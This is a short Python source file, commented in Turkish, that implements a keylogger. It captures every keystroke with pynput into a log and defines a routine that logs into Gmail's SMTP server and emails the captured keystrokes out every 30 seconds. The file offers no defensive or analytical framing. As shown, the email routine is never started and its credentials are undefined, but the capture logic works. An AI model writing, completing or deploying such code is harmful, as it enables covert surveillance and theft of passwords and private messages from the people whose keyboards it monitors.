import pynput.keyboard
import smtplib
import threading

log = ''  # Tuş vuruşlarını ve karakterleri kaydetmek için bir değişken

# Klavye tuşlarına basıldığında çağrılacak geri çağırma işlevi
def callback_function(key):
    global log
    try:
        log += str(key.char)  # Eğer basılan bir karakter ise, log değişkenine ekler
    except AttributeError:
        if key == key.space:
            log = log + " "  # Boşluk tuşuna basıldıysa, log değişkenine bir boşluk ekler
        elif key == key.tab:
            log = log + 'tab'  # Sekme tuşuna basıldıysa, log değişkenine 'tab' ekler
        elif key == key.backspace:
            log += 'silme'  # Geri tuşuna basıldıysa, log değişkenine 'silme' ekler
        elif key == key.enter:
            log += 'enter'  # Enter tuşuna basıldıysa, log değişkenine 'enter' ekler
        else:
            log += str(key)  # Diğer tuşlara basıldıysa, tuşun temsilini ekler
    except:
        pass

    print(log)  # Günlüğü ekrana basar

# E-posta gönderme işlevi
def send_email(email, password, message):
    email_server = smtplib.SMTP('smtp.gmail.com', 587)
    email_server.starttls()
    email_server.login(email, password)
    email_server.sendmail(email, email, message)
    email_server.quit()

# Tuş vuruşlarını dinleyen nesne
keylogger_listener = pynput.keyboard.Listener(on_press=callback_function)

# E-posta gönderme ve zamanlayıcı işlevi
def threading_function():
    global log
    send_email(email, password, log.encode('utf-8'))  # Belirtilen e-posta ile log bilgilerini gönderir
    log = ''  # Günlüğü sıfırlar
    timer_object = threading.Timer(30, threading_function)  # 30 saniye sonra işlemi tekrar çağırır
    timer_object.start()

# Anahtar dinleme döngüsünü başlatır
with keylogger_listener:
    keylogger_listener.join()
